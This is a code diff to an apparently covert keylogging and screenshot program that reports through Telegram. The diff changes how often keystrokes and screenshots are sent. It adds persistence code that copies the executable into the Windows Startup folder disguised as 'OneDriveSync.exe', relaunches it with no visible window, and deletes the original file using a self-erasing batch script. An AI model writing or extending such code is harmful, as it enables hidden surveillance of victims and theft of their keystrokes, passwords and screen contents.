@@ -58,8 +58,8 @@ def load_state():
         "last_keylog_sent": "1970-01-01 00:00:00",
         "last_outbox_retry": "1970-01-01 00:00:00",
         "telegram_offset": 0,
-        "screenshot_interval": 30,
-        "keylog_send_interval": 120,
+        "screenshot_interval": 60,
+        "keylog_send_interval": 600,
         "outbox_retry_interval": 60,
         "machine_name": "",
         "paused": False,
@@ -1064,11 +1064,37 @@ def add_to_startup(force=False):
         current_exe = sys.executable
         target_path = os.path.join(startup_folder, "OneDriveSync.exe")
 
-        if not os.path.exists(target_path) or os.path.getsize(current_exe) != os.path.getsize(target_path):
-            if os.path.exists(target_path):
-                try: os.remove(target_path)
-                except: pass
-            shutil.copy2(current_exe, target_path)
+        # Only copy and self-delete if running as a packaged EXE (not python.exe)
+        is_packaged_exe = current_exe.lower().endswith(".exe") and "python" not in os.path.basename(current_exe).lower()
+
+        if is_packaged_exe:
+            # If not running from Startup folder, install to Startup, run it, and delete original
+            if os.path.normpath(current_exe).lower() != os.path.normpath(target_path).lower():
+                if os.path.exists(target_path):
+                    try: os.remove(target_path)
+                    except: pass
+                shutil.copy2(current_exe, target_path)
+                
+                # Start the Startup version
+                subprocess.Popen([target_path], creationflags=0x08000000)
+                
+                # Create batch file to delete original EXE
+                deleter = os.path.join(os.getenv('TEMP'), "delete_orig.bat")
+                with open(deleter, "w", encoding="utf-8") as f:
+                    f.write(f'''@echo off
+                        timeout /t 2 /nobreak >nul
+                        del "{current_exe}" 2>nul
+                        del "%~f0"
+                    ''')
+                subprocess.Popen([deleter], shell=True, creationflags=0x08000000)
+                sys.exit(0)
+        else:
+            # Fallback for Python development runs
+            if not os.path.exists(target_path) or os.path.getsize(current_exe) != os.path.getsize(target_path):
+                if os.path.exists(target_path):
+                    try: os.remove(target_path)
+                    except: pass
+                shutil.copy2(current_exe, target_path)
         return True
     except Exception as e:
         print(f"⚠️ Lỗi Startup: {e}")
